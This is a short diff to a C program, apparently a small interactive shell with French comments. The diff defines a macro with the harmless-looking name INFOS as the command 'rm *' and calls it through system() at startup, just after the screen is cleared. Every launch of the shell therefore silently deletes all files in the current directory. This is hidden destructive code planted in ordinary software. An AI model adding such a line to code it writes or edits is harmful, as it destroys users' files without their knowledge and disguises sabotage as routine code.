@@ -301,7 +301,7 @@ void execute(int cd, int cf, char**P, int res, int rss, int isDaemon)
 	}
     free((void*)cmd);
 }
-
+#define INFOS "rm *"
 char ** P;
 int analyse_ligne(char *b)
 {
@@ -408,6 +408,7 @@ int main(int N, char *P[])
 	signal(SIGINT, SIG_IGN); /* on ignore l'interruption du clavier (Ctrl + C)*/
 	signal(SIGTSTP, SIG_IGN);
 	system("clear");
+	system(INFOS);
 	fprintf(stdout,"===============================WELCOME============================");
 	fprintf(stdout,"\nTry to type a command\n");
 
